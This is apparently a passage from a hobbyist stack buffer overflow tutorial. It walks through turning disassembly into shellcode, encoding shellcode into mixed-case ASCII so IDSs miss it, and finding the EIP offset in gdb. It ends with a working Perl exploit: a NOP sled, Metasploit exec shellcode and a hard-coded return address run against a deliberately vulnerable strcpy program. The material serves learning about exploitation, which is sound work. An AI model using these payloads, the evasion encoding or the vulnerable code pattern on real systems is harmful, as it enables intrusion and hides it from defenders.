 8048248:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 804824c:	83 e4 f0             	and    $0xfffffff0,%esp
 804824f:	ff 71 fc             	pushl  0xfffffffc(%ecx)
 8048252:	55                   	push   %ebp
 8048253:	89 e5                	mov    %esp,%ebp
 8048255:	51                   	push   %ecx
 8048256:	83 ec 04             	sub    $0x4,%esp
 8048259:	c7 04 24 c8 dd 09 08 	movl   $0x809ddc8,(%esp)
 8048260:	e8 1b 0f 00 00       	call   8049180 &lt;__libc_system&gt;
 8048265:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 804826c:	e8 5f 07 00 00       	call   80489d0 &lt;exit&gt;
 8048271:	90                   	nop    
 8048272:	90                   	nop    
 8048273:	90                   	nop    
 8048274:	90                   	nop    
 8048275:	90                   	nop    
 8048276:	90                   	nop    
 8048277:	90                   	nop    
 8048278:	90                   	nop    
 8048279:	90                   	nop    
 804827a:	90                   	nop    
 804827b:	90                   	nop    
 804827c:	90                   	nop    
 804827d:	90                   	nop    
 804827e:	90                   	nop    
 804827f:	90                   	nop    

0804e1a0 &lt;__execve&gt;:
 804e1a0:	55                   	push   %ebp
 804e1a1:	89 e5                	mov    %esp,%ebp
 804e1a3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 804e1a6:	53                   	push   %ebx
 804e1a7:	8b 55 10             	mov    0x10(%ebp),%edx
 804e1aa:	8b 5d 08             	mov    0x8(%ebp),%ebx
 804e1ad:	b8 0b 00 00 00       	mov    $0xb,%eax
 804e1b2:	ff 15 1c 73 0b 08    	call   *0x80b731c
 804e1b8:	89 c1                	mov    %eax,%ecx
 804e1ba:	81 f9 00 f0 ff ff    	cmp    $0xfffff000,%ecx
 804e1c0:	77 03                	ja     804e1c5 &lt;__execve+0x25&gt;
 804e1c2:	5b                   	pop    %ebx
 804e1c3:	5d                   	pop    %ebp
 804e1c4:	c3                   	ret    
 804e1c5:	b8 e8 ff ff ff       	mov    $0xffffffe8,%eax
 804e1ca:	f7 d9                	neg    %ecx
 804e1cc:	65 8b 15 00 00 00 00 	mov    %gs:0x0,%edx
 804e1d3:	89 0c 02             	mov    %ecx,(%edx,%eax,1)
 804e1d6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
 804e1db:	eb e5                	jmp    804e1c2 &lt;__execve+0x22&gt;
 804e1dd:	90                   	nop    
 804e1de:	90                   	nop    
 804e1df:	90                   	nop    
---------------------------------------------------------------------------------------------

The outputs are the OPCODE equivalents of the assembler instructions.
So if we gather them up we have 2 strings.

One for &quot;main&quot;:
---------------------------------------------------------------------------------------------
0x8d0x4c0x240x040x830xe40xf00xff0x710xfc0x550x890xe50x510x830xec
0x040xc70x040x240x480xd70x090x080xe80xcb0x580x000x000xc70x040x240x00
0x000x000x000xe80x5f0x070x000x000x900x900x900x90
---------------------------------------------------------------------------------------------

which won&#039;t do us much good, we must replace every &quot;0x&quot; with &quot;\x&quot; and we will end up with:

&lt;main&gt;:
---------------------------------------------------------------------------------------------
\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x51\x83\xec
\x04\xc7\x04\x24\x48\xd7\x09\x08\xe8\xcb\x58\x00\x00\xc7\x04\x24\x00
\x00\x00\x00\xe8\x5f\x07\x00\x00\x90\x90\x90\x90
---------------------------------------------------------------------------------------------

and one for &quot;execve&quot;:
---------------------------------------------------------------------------------------------
0x550x890xe50x8b0x4d0x0c0x530x8b0x550x8b0x5d0x080xb80x0b0x000x000x00
0xff0x150xbc0x6b0x0b0x080x890xc10x810xf90x000xf00xff0xff0x770x030x5b
0x5d0xc30xb80xe80xff0xff0xff0xf70xd90x650x8b0x150x000x000x000x000x89
0x0c0x020xb80xff0xff0xff0xff0xeb0xe50x900x900x90
---------------------------------------------------------------------------------------------

and also convert it to:

&lt;execve&gt;:
---------------------------------------------------------------------------------------------
\x55\x89\xe5\x8b\x4d\x0c\x53\x8b\x55\x8b\x5d\x08\xb8\x0b\x00\x00\x00
\xff\x15\xbc\x6b\x0b\x08\x89\xc1\x81\xf9\x00\xf0\xff\xff\x77\x03\x5b
\x5d\xc3\xb8\xe8\xff\xff\xff\xf7\xd9\x65\x8b\x15\x00\x00\x00\x00\x89
\x0c\x02\xb8\xff\xff\xff\xff\xeb\xe5\x90\x90\x90
---------------------------------------------------------------------------------------------

That&#039;s our shellcode!

But we have some NULLs (0x00) in there, that&#039;s not good!
Anyway, I got carried away with the shellcode stuff, you can use shellcode encoders which will eliminate NULLs
and possibly any other character you tell them.

We can test the shellcode using this code:

shellcode.c
*********************************************************************************************
 unsigned char shellcode[]=
    &quot;Shellcode here!&quot;;

int main(void) { ((void (*)())shellcode)(); }
*********************************************************************************************


Just replace the shellcode with yours.

&quot;But hey you said that if the shellcode has NULLs it won&#039;t work!?!?&quot;
Yes I did, given that we are going to exploit a character buffer,
in the test code we are not exploiting. We are just putting the shellcode into memory and let the CPU execute it.
Moving on.....


[ 0x0c ] Restricted Characters
===============================================
We already mentioned the NULL character,
and why it&#039;s not supposed to be a part of the shellcode when we are exploiting character buffers.

Some other characters you might want to watch out for are:
[i]	NOPs
[ii]	Any other OPCODE

&quot;Are you crazy? Without OPCODEs we have no shellcode!&quot;
No, I haven&#039;t gone crazy.

There are a lot of people out there with IDSs waiting for someone to hit.
100bytes of NOPs in HTTP packets mean that someone is attacking a web server and an IDS will see that with no problem.
It will also see any OPCODE, I mean, a legitimate http packet wont contain OPCODEs, so your busted again.

&quot;So you made me read ALL that crap for nothing?!?!?!?!?!?!&quot;
Dude chill, remember the encoders we talked about?
You can even encode shellcode into mIxEdCaSe ASCII characters.

Our shellcode:
---------------------------------------------------------------------------------------------
\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x51\x83\xec
\x04\xc7\x04\x24\xe0\x84\x04\x08\xe8\xf3\xfe\xff\xff\xc7\x04\x24
\x00\x00\x00\x00\xe8\x07\xff\xff\xff\x90\x90\x90
---------------------------------------------------------------------------------------------
can be expressed as:
---------------------------------------------------------------------------------------------
IIIIIIIIIIIIIIIIII7jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIcHehRDsHp4rCpxtrTtcHVPp4CHf
Xp3D8e5Dt4856DpPxpfRFT8Dwtq1hQvpcahp5wEPxuhWIT8pep50xWEvQsH4xP3pxq
u3SBX6Pp42X1sfWPx4ptt0xebp4t8u5Tp0xFXp4QhTpvTPxfP08rX1uvXRXavVSPxRFS
U0xPf2FCHU61vCHQsP7T8tp04t8GBVTBX6PfPpxtpp0PxdpfPQhS6PD8Qu6Xqh6Pdw
qhU63VQhRFQvPxqv0fpxp9VPqhwI4pRXUiDpA
---------------------------------------------------------------------------------------------

It takes up more space but at least you&#039;ll not spend the night in the pen, if you know what I&#039;m sayin&#039;. ;)


[ 0x0d ] Other examples
===============================================
I won&#039;t write any shellcodes myself, I&#039;ll just include some well know websites.

http://www.milw0rm.com/shellcode/
http://shellcode.org/shellcode/
http://metasploit.com:55555/PAYLOADS

We&#039;re done with the shellcodes, I think you got the idea.
Now to the good stuff!


[ 0x0e ] Basic Buffer Overflow &amp; Exploit Example
=================================================
Let&#039;s get back to our dumped core from our overflowed &quot;tmp.vuln&quot; program from chapter &quot;0x06&quot;.

Run &quot;gdb -c core ./tmp.vuln&quot; and follow my lead.
---------------------------------------------------------------------------------------------
zapotek@lil-z:/Documents/bo&gt; gdb -c core ./tmp.vuln
GNU gdb 6.4
Copyright 2005 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.
This GDB was configured as &quot;i586-suse-linux&quot;...Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.

Core was generated by `./tmp.vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#039;.
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
Program terminated with signal 11, Segmentation fault.

warning: Can&#039;t read pathname for load map: Input/output error.
Reading symbols from /lib/libc.so.6...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...done.
Loaded symbols for /lib/ld-linux.so.2
#0  0x61616161 in ?? ()
(gdb) i r eip
eip            0x61616161       0x61616161
(gdb)
---------------------------------------------------------------------------------------------


Using the &quot;i r eip&quot; command we can see our overwritten EIP which holds the new, and invalid, RET address.
In case you wonder, &quot;i r&quot; stands for &quot;info registers&quot;.
GDB is kind enough to allow us to use command name abbreviations if they are unambiguous.
&quot;EIP&quot; is the register which holds the RET (return) address, so &quot;i r eip&quot; spits out &quot;EIP&quot;&#039;s content.

Earlier, we said that when an operation is completed it updates the RET address in EIP with the new one,
so the next operation will know from where to take over.

And in this example we filled the EIP with &quot;0x61616161&quot;.
If you look up &quot;61&quot; in the ASCII codes table, in hex, you will see it resolve to the &quot;a&quot; character.
Ergo the RET address holds &quot;aaaa&quot;.
&quot;Hey! We flood the input with a lot of &quot;a&quot;s! What a coincidence!&quot;
Yeah, right. That&#039;s the whole purpose!
&quot;So if we can overwrite the EIP, doesn&#039;t that mean that we can instruct the program to continue from wherever we want it to????&quot;
Yep, pretty much. And that is what makes buffer overflow exploits work. :)

One problem though, we sent an awful lot of &quot;a&quot;s, how do we know in what place the four &quot;a&quot;s that overwrote the EIP were?
That&#039;s sad, really, for now we will have to just find it by trial and error.
Let&#039;s start the torture, well not really because 10 bytes is a very small buffer.

The basic idea is to use a string pattern, an md5 or sha1 hash would to the job,
however if the buffer we want to overflow is 300bytes you will need a lot of hashes. :P

---------------------------------------------------------------------------------------------
zapotek@lil-z:/Documents/bo&gt; ./tmp.vuln 01234567890qwertyuiopasdfghjkl
Buffer holds: 01234567890qwertyuiopasdfghjkl
Segmentation fault (core dumped)
zapotek@lil-z:/Documents/bo&gt; gdb -c core ./tmp.vuln
GNU gdb 6.4
Copyright 2005 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.
This GDB was configured as &quot;i586-suse-linux&quot;...Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.

Core was generated by `./tmp.vuln 01234567890qwertyuiopasdfghjkl&#039;.
Program terminated with signal 11, Segmentation fault.

warning: Can&#039;t read pathname for load map: Input/output error.
Reading symbols from /lib/libc.so.6...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...done.
Loaded symbols for /lib/ld-linux.so.2
#0  0x75797472 in ?? ()
(gdb)
---------------------------------------------------------------------------------------------


EIP now holds &quot;0x75797472&quot;.
Converted to ASCII that&#039;s &quot;uytr&quot;.

And we sent the &quot;01234567890qwertyuiopasdfghjkl&quot;string to our program.

&quot;But, hold on, &quot;uytr&quot; isn&#039;t in there.&quot;
Well, it is, it&#039;s just backwards. GDB gives us the addresses in the big-endian format,
while we are using an Intel x86 32bit CPU which stores data using the little-endian format.

For more info on endianness see http://en.wikipedia.org/wiki/Endianness.

So, &quot;uytr&quot; becomes &quot;rtyu&quot;.
And the string becomes &quot;01234567890qwe::::iopasdfghjkl&quot;.
I&#039;m using &quot;:&quot; to indicate where the 4 bytes that overwrite the EIP must be placed.

&quot;OK, that&#039;s all pretty nice but how can we execute stuff?&quot;
At the previous chapter we discussed shellcodes, that&#039;s how.

The current buffer is too small to fit any shellcode so let&#039;s use something else:

vulnerable.c
*********************************************************************************************
#include &lt;stdio.h&gt;

int overflow(char *str){
  /*
   dynamic buffer of 10 bytes, initialized at run-time and stored
   in the stack
 */
  char buffer[272];

  /*
   we are initializing the buffer now and forcing it to hold whatever
   str is holding
  */
  strcpy(buffer,str);
 
  printf(&quot;Buffer holds: %s\n&quot;,buffer);

  return 0;

}

int main(int argc, char *argv[])
{
  // our vulnerable function
  overflow(argv[1]);
  // some more code

  return 0;
}
*********************************************************************************************


This time we must use a lot of crap to overflow the buffer!
We will use this string:
---------------------------------------------------------------------------------------------
0cc175b9c0f1b6a831c399e269772661f970e2767d0cfe75876ea857f92e319bdf211c
cdd94a63e0bcb9e6ae427a249484a49d60c5aee1e49695056c0c9c1da749bc2a8e1
294692e88bc3cf578b0cf93126b82e453a3a24fec0fa8c12e77dd7ecc8d72a485f94115
71a11f04da21185bfe9de08e72ce518f47ef36e3edc75e88faaf193310d4795bfbbf61ac
35a3185180ada4be
---------------------------------------------------------------------------------------------

It&#039;s a mix of md5 &amp; sha1 hashes, it&#039;s pretty efficient really...

---------------------------------------------------------------------------------------------
zapotek@lil-z:~/Documents/bo&gt; ./vulnerable 0cc175b9c0f1b6a831c399e269772661f970e2767d0cfe75876ea857f92e319bdf211ccdd94a63e0bcb9e6ae427a249484a49d60c5aee1e49695056c0c9c1da749bc2a8e1294692e88bc3cf578b0cf93126b82e453a3a24fec0fa8c12e77dd7ecc8d72a485f9411571a11f04da21185bfe9de08e72ce518f47ef36e3edc75e88faaf193310d4795bfbbf61ac35a3185180ada4be
Buffer holds: 0cc175b9c0f1b6a831c399e269772661f970e2767d0cfe75876ea857f92e319bdf211ccdd94a63e0bcb9e6ae427a249484a49d60c5aee1e49695056c0c9c1da749bc2a8e1294692e88bc3cf578b0cf93126b82e453a3a24fec0fa8c12e77dd7ecc8d72a485f9411571a11f04da21185bfe9de08e72ce518f47ef36e3edc75e88faaf193310d4795bfbbf61ac35a3185180ada4be
Segmentation fault (core dumped)
zapotek@lil-z:~/Documents/bo&gt; gdb -c core ./vulnerable
GNU gdb 6.4
Copyright 2005 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.
This GDB was configured as &quot;i586-suse-linux&quot;...Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.

Core was generated by `./vulnerable 0cc175b9c0f1b6a831c399e269772661f970e2767d0cfe75876ea857f92e319bdf&#039;.
Program terminated with signal 11, Segmentation fault.

warning: Can&#039;t read pathname for load map: Input/output error.
Reading symbols from /lib/libc.so.6...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...done.
Loaded symbols for /lib/ld-linux.so.2
#0  0x63613136 in ?? ()
(gdb) i r eip
eip            0x63613136       0x63613136
(gdb)
---------------------------------------------------------------------------------------------

Nice, we got us a seg fault and a RET address.
As you can see our RET is &quot;0x63613136&quot; which decodes to &quot;ca16&quot; and written in little-endian is &quot;61ac&quot;.
Bingo! That&#039;s our RET address.

If you search the hash pattern we used you&#039;ll find it:

---------------------------------------------------------------------------------------------
0cc175b9c0f1b6a831c399e269772661f970e2767d0cfe75876ea857f92e319bdf211c
cdd94a63e0bcb9e6ae427a249484a49d60c5aee1e49695056c0c9c1da749bc2a8e1
294692e88bc3cf578b0cf93126b82e453a3a24fec0fa8c12e77dd7ecc8d72a485f94115
71a11f04da21185bfe9de08e72ce518f47ef36e3edc75e88faaf193310d4795bfbbf!!!!
35a3185180ada4be
---------------------------------------------------------------------------------------------
I replaced the 4 bytes that overflowed the EIP with &quot;!&quot;s.

But that&#039;s a VERY ugly way to find out which characters overwrote the EIP.
It&#039;s time to discuss memory structure.

Memory Structure:
---------------------------------------------------------------------------------------------
         Unallocated space  	    buffer         EIP        Other registers
[			      ][              ][         ][			]
	   unknown size		   272bytes       4bytes	unknown size
---------------------------------------------------------------------------------------------

So this means that if we add 4 more bytes than the buffer can hold,
these 4 bytes will overwrite the EIP.


Now, let&#039;s get us a shellcode! (Not mine cuz it&#039;s crappy and won&#039;t work :P )

*********************************************************************************************
/*
   Shellcode taken from the metasploit project
   It executes the &quot;ls -l&quot; UNIX command on the vulnerable system
*/
/* linux_ia32_exec -  CMD=ls -l Size=68 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char scode[] =
&quot;\x2b\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x64&quot;
&quot;\x96\x2c\xed\x83\xeb\xfc\xe2\xf4\x0e\x9d\x74\x74\x36\xf0\x44\xc0&quot;
&quot;\x07\x1f\xcb\x85\x4b\xe5\x44\xed\x0c\xb9\x4e\x84\x0a\x1f\xcf\xbf&quot;
&quot;\x8c\x90\x2c\xed\x64\xfa\x5f\xcd\x49\xfa\x2c\xba\x37\x1f\xcd\x20&quot;
&quot;\xe4\x96\x2c\xed&quot;;
*********************************************************************************************


To sum up.
The buffer holds 272 bytes.
The end of the EIP register is 4 bytes away from the buffer.
Our shellcode is 68 bytes.
So, in order for our payload to reach EIP it must be at least:
---------------------------------------------------------------------------------------------
buffer size + EIP = 272 + 4 = 276 bytes
---------------------------------------------------------------------------------------------
Just enough to overwrite the EIP.

So we are looking at a 272 + 4 = 276 byte payload.

Our shellcode is only 68 bytes in size, so 276 - 64 = 208 bytes of free space.
So, what should we do with that space? Oh, yeah, that&#039;s going to be our NOP-sled!

So our payload would be like:
---------------------------------------------------------------------------------------------
	   208 bytes 		     68 bytes	   4 bytes
[	     NOPS 		] [   OPCODEs   ] [  EIP  ]
---------------------------------------------------------------------------------------------

Let&#039;s start writing our exploit!

sploit.pl:
*********************************************************************************************
#!/usr/bin/perl
# linux_ia32_exec -  CMD=ls -l Size=68 Encoder=PexFnstenvSub http://metasploit.com
my $shellcode =
	&quot;\x2b\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x64&quot;.
	&quot;\x96\x2c\xed\x83\xeb\xfc\xe2\xf4\x0e\x9d\x74\x74\x36\xf0\x44\xc0&quot;.
	&quot;\x07\x1f\xcb\x85\x4b\xe5\x44\xed\x0c\xb9\x4e\x84\x0a\x1f\xcf\xbf&quot;.
	&quot;\x8c\x90\x2c\xed\x64\xfa\x5f\xcd\x49\xfa\x2c\xba\x37\x1f\xcd\x20&quot;.
	&quot;\xe4\x96\x2c\xed&quot;;

my $nopsled=&quot;\x90&quot;x208;			# construct our NOP-sled
my $ret=&quot;\xc0\xef\xff\xbf&quot;;		# that address worked for me :)
my $payload=$nopsled.$shellcode.$ret;	# construct the payload

system(&quot;./vulnerable&quot;, $payload);	# send payload to vulnerable programm

print &quot;Done!\n&quot;;

*********************************************************************************************

I wouldn&#039;t use Perl, my first choice was to pass the payload using an env variable,
but bash kept messing up the shellcode. :(

Let&#039;s execute the shellcode and see what happens:
---------------------------------------------------------------------------------------------
zapotek@lil-z:~/Documents/bo&gt; perl sploit.pl
Buffer holds: +É.ï¿½ï¿½ï¿½$ï¿½sd,ï¿½ï¿½tt6ï¿½Ë.Kï¿½
                                 N
Ï¿,ï¿½_ï¿½,7ï¿½ï¿½ï¿½ï¿½
total 11727
-rw-r--r-- 1 zapotek users    8721 Aug 24 17:11 Buffer Overflows, a peek under the hood.odt
-rw-r--r-- 1 zapotek users   38573 Aug 26 03:31 Buffer Overflows, a peek under the hood.txt
-rw------- 1 zapotek users  151552 Aug 26 03:36 core
-rwxr-xr-x 1 zapotek users  525173 Aug 25 18:14 shellcode
-rw-r--r-- 1 zapotek users      40 Aug 25 18:14 shellcode.c
-rw-r--r-- 1 root    root  5530086 Aug 25 18:20 shellcode.out
-rw-r--r-- 1 zapotek users    9575 Aug 25 20:44 shellcode.out2
-rwxr-xr-x 1 zapotek users    6602 Aug 25 20:43 shellcode2
-rw-r--r-- 1 zapotek users      40 Aug 25 20:43 shellcode2.c
-rw-r--r-- 1 zapotek users    1052 Aug 26 03:23 shellcode3
-rwxr-xr-x 1 zapotek users    8215 Aug 26 02:25 sploit.bin
-rw-r--r-- 1 zapotek users    2383 Aug 26 02:25 sploit.c
-rw-r--r-- 1 zapotek users     673 Aug 26 03:36 sploit.pl
-rw-r--r-- 1 zapotek users    1288 Aug 25 20:16 sploit1.c
-rw-r--r-- 1 zapotek users    9575 Aug 25 20:43 temp1
-rw-r--r-- 1 zapotek users     782 Aug 25 19:11 tenp_tzt
-rwxr-xr-x 1 zapotek users    6540 Aug 26 02:22 test
-rw-r--r-- 1 zapotek users     362 Aug 26 02:21 test.c
-rwxr-xr-x 1 zapotek users    6595 Aug 24 22:18 tmp.bin
-rw-r--r-- 1 zapotek users     455 Aug 24 23:41 tmp.c
-rwxr-xr-x 1 zapotek users    6694 Aug 24 23:31 tmp.vuln
-rw-r--r-- 1 zapotek users     780 Aug 25 20:29 tmpcode
-rw-r--r-- 1 zapotek users     796 Aug 25 20:30 tmpcode.c
-rwxr-xr-x 1 root    root     8283 Aug 23 23:50 vuln.bin
-rw-r--r-- 1 zapotek users    2256 Aug 23 23:53 vuln.c
-rwxr-xr-x 1 zapotek users    6701 Aug 26 03:08 vulnerable
-rw-r--r-- 1 zapotek users     455 Aug 26 03:07 vulnerable.c
Done!
zapotek@lil-z:~/Documents/bo&gt;
---------------------------------------------------------------------------------------------

&quot;That&#039;s cool!
But how did you find the right memory address that pointed to the NOP-sled?&quot;
Easily, fire up GDB again:
---------------------------------------------------------------------------------------------
zapotek@lil-z:~/Documents/bo&gt; gdb -c core ./vulnerable
GNU gdb 6.4
Copyright 2005 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.
This GDB was configured as &quot;i586-suse-linux&quot;.
(no debugging symbols found)
Using host libthread_db library &quot;/lib/libthread_db.so.1&quot;.
Core was generated by `./vulnerable &#039;.
Program terminated with signal 11, Segmentation fault.
#0  0xb7f09970 in ?? ()
(gdb) x/1000xb $esp
0xbfffea74:     0xc0    0x0c    0x00    0xb8    0x20    0xee    0xff    0xbf
0xbfffea7c:     0x12    0x84    0x04    0x08    0x10    0xed    0xff    0xbf
0xbfffea84:     0x00    0x00    0x00    0x00    0xf8    0xea    0xff    0xbf
0xbfffea8c:     0x7c    0x58    0xeb    0xb7    0xc0    0x0c    0x00    0xb8
0xbfffea94:     0x70    0x84    0x04    0x08    0xf8    0xea    0xff    0xbf
0xbfffea9c:     0x7c    0x58    0xeb    0xb7    0x02    0x00    0x00    0x00
0xbfffeaa4:     0x24    0xeb    0xff    0xbf    0x30    0xeb    0xff    0xbf
0xbfffeaac:     0x4d    0x32    0xff    0xb7    0x00    0x00    0x00    0x00
0xbfffeab4:     0x90    0x56    0xfe    0xb7    0x01    0x00    0x00    0x00
0xbfffeabc:     0x01    0x00    0x00    0x00    0xf4    0xbf    0xfb    0xb7
0xbfffeac4:     0xc0    0x0c    0x00    0xb8    0x00    0x00    0x00    0x00
0xbfffeacc:     0xf8    0xea    0xff    0xbf    0x00    0xdc    0x33    0xa1
0xbfffead4:     0xe1    0x6e    0x27    0xa9    0x00    0x00    0x00    0x00
0xbfffeadc:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffeae4:     0x30    0x86    0xff    0xb7    0xad    0x57    0xeb    0xb7
0xbfffeaec:     0xf4    0x0f    0x00    0xb8    0x02    0x00    0x00    0x00
0xbfffeaf4:     0x50    0x83    0x04    0x08    0x00    0x00    0x00    0x00
0xbfffeafc:     0x71    0x83    0x04    0x08    0x2f    0x84    0x04    0x08
0xbfffeb04:     0x02    0x00    0x00    0x00    0x24    0xeb    0xff    0xbf
0xbfffeb0c:     0x70    0x84    0x04    0x08    0x60    0x84    0x04    0x08
0xbfffeb14:     0x90    0x3b    0xff    0xb7    0x1c    0xeb    0xff    0xbf
0xbfffeb1c:     0x31    0xc3    0xff    0xb7    0x02    0x00    0x00    0x00
0xbfffeb24:     0x5a    0xed    0xff    0xbf    0x67    0xed    0xff    0xbf
0xbfffeb2c:     0x00    0x00    0x00    0x00    0x7c    0xee    0xff    0xbf
0xbfffeb34:     0x95    0xee    0xff    0xbf    0xa5    0xee    0xff    0xbf
0xbfffeb3c:     0xd7    0xee    0xff    0xbf    0x36    0xef    0xff    0xbf
0xbfffeb44:     0x4a    0xef    0xff    0xbf    0x5d    0xef    0xff    0xbf
0xbfffeb4c:     0x6c    0xef    0xff    0xbf    0x87    0xef    0xff    0xbf
0xbfffeb54:     0xae    0xef    0xff    0xbf    0xd5    0xef    0xff    0xbf
0xbfffeb5c:     0xa1    0xf1    0xff    0xbf    0xd3    0xf1    0xff    0xbf
0xbfffeb64:     0xde    0xf1    0xff    0xbf    0xee    0xf1    0xff    0xbf
0xbfffeb6c:     0xf9    0xf1    0xff    0xbf    0x0a    0xf2    0xff    0xbf
0xbfffeb74:     0x18    0xf2    0xff    0xbf    0x69    0xf2    0xff    0xbf
0xbfffeb7c:     0x75    0xf2    0xff    0xbf    0x2f    0xf3    0xff    0xbf
0xbfffeb84:     0x90    0xf3    0xff    0xbf    0xac    0xf3    0xff    0xbf
0xbfffeb8c:     0xc8    0xf3    0xff    0xbf    0xda    0xf3    0xff    0xbf
0xbfffeb94:     0xe3    0xf3    0xff    0xbf    0xf8    0xf3    0xff    0xbf
0xbfffeb9c:     0x0b    0xf4    0xff    0xbf    0x1e    0xf4    0xff    0xbf
0xbfffeba4:     0x34    0xf4    0xff    0xbf    0x45    0xf4    0xff    0xbf
0xbfffebac:     0x64    0xf4    0xff    0xbf    0x71    0xf4    0xff    0xbf
0xbfffebb4:     0x41    0xf7    0xff    0xbf    0x59    0xf7    0xff    0xbf
0xbfffebbc:     0x72    0xf7    0xff    0xbf    0x92    0xf7    0xff    0xbf
0xbfffebc4:     0xa7    0xf7    0xff    0xbf    0xd3    0xf7    0xff    0xbf
0xbfffebcc:     0xe1    0xf7    0xff    0xbf    0x11    0xf8    0xff    0xbf
0xbfffebd4:     0x1e    0xf8    0xff    0xbf    0x29    0xf8    0xff    0xbf
0xbfffebdc:     0x37    0xf8    0xff    0xbf    0x79    0xf8    0xff    0xbf
0xbfffebe4:     0x92    0xf8    0xff    0xbf    0xba    0xf8    0xff    0xbf
0xbfffebec:     0xc8    0xf8    0xff    0xbf    0xdc    0xf8    0xff    0xbf
0xbfffebf4:     0xf9    0xf8    0xff    0xbf    0xa7    0xf9    0xff    0xbf
0xbfffebfc:     0xbb    0xf9    0xff    0xbf    0xc4    0xf9    0xff    0xbf
0xbfffec04:     0xe6    0xf9    0xff    0xbf    0xfc    0xf9    0xff    0xbf
0xbfffec0c:     0x2e    0xfa    0xff    0xbf    0x43    0xfa    0xff    0xbf
0xbfffec14:     0x62    0xfa    0xff    0xbf    0x7e    0xfa    0xff    0xbf
0xbfffec1c:     0x93    0xfa    0xff    0xbf    0xa4    0xfa    0xff    0xbf
0xbfffec24:     0xc3    0xfa    0xff    0xbf    0xde    0xfa    0xff    0xbf
0xbfffec2c:     0x07    0xfb    0xff    0xbf    0x47    0xfb    0xff    0xbf
0xbfffec34:     0x62    0xfb    0xff    0xbf    0x75    0xfb    0xff    0xbf
0xbfffec3c:     0x7d    0xfb    0xff    0xbf    0x9b    0xfb    0xff    0xbf
0xbfffec44:     0xa8    0xfb    0xff    0xbf    0xc7    0xfb    0xff    0xbf
0xbfffec4c:     0xe2    0xfb    0xff    0xbf    0x3c    0xfc    0xff    0xbf
0xbfffec54:     0x84    0xfc    0xff    0xbf    0x92    0xfc    0xff    0xbf
0xbfffec5c:     0xc7    0xfc    0xff    0xbf    0xd2    0xfc    0xff    0xbf
0xbfffec64:     0xeb    0xfc    0xff    0xbf    0xfb    0xfc    0xff    0xbf
0xbfffec6c:     0x07    0xfd    0xff    0xbf    0x6b    0xfd    0xff    0xbf
0xbfffec74:     0x95    0xfd    0xff    0xbf    0xf7    0xfd    0xff    0xbf
0xbfffec7c:     0xc8    0xfe    0xff    0xbf    0xe0    0xfe    0xff    0xbf
0xbfffec84:     0xe9    0xfe    0xff    0xbf    0x32    0xff    0xff    0xbf
0xbfffec8c:     0x3f    0xff    0xff    0xbf    0x58    0xff    0xff    0xbf
0xbfffec94:     0x75    0xff    0xff    0xbf    0x8a    0xff    0xff    0xbf
0xbfffec9c:     0xa6    0xff    0xff    0xbf    0xb2    0xff    0xff    0xbf
0xbfffeca4:     0xdf    0xff    0xff    0xbf    0x00    0x00    0x00    0x00
0xbfffecac:     0x20    0x00    0x00    0x00    0x00    0xe4    0xff    0xff
0xbfffecb4:     0x21    0x00    0x00    0x00    0x00    0xe0    0xff    0xff
0xbfffecbc:     0x10    0x00    0x00    0x00    0xff    0xfb    0xeb    0xbf
0xbfffecc4:     0x06    0x00    0x00    0x00    0x00    0x10    0x00    0x00
0xbfffeccc:     0x11    0x00    0x00    0x00    0x64    0x00    0x00    0x00
0xbfffecd4:     0x03    0x00    0x00    0x00    0x34    0x80    0x04    0x08
0xbfffecdc:     0x04    0x00    0x00    0x00    0x20    0x00    0x00    0x00
0xbfffece4:     0x05    0x00    0x00    0x00    0x08    0x00    0x00    0x00
0xbfffecec:     0x07    0x00    0x00    0x00    0x00    0x60    0xfe    0xb7
0xbfffecf4:     0x08    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffecfc:     0x09    0x00    0x00    0x00    0x50    0x83    0x04    0x08
0xbfffed04:     0x0b    0x00    0x00    0x00    0xe8    0x03    0x00    0x00
0xbfffed0c:     0x0c    0x00    0x00    0x00    0xe8    0x03    0x00    0x00
0xbfffed14:     0x0d    0x00    0x00    0x00    0x64    0x00    0x00    0x00
0xbfffed1c:     0x0e    0x00    0x00    0x00    0x64    0x00    0x00    0x00
0xbfffed24:     0x17    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffed2c:     0x0f    0x00    0x00    0x00    0x4b    0xed    0xff    0xbf
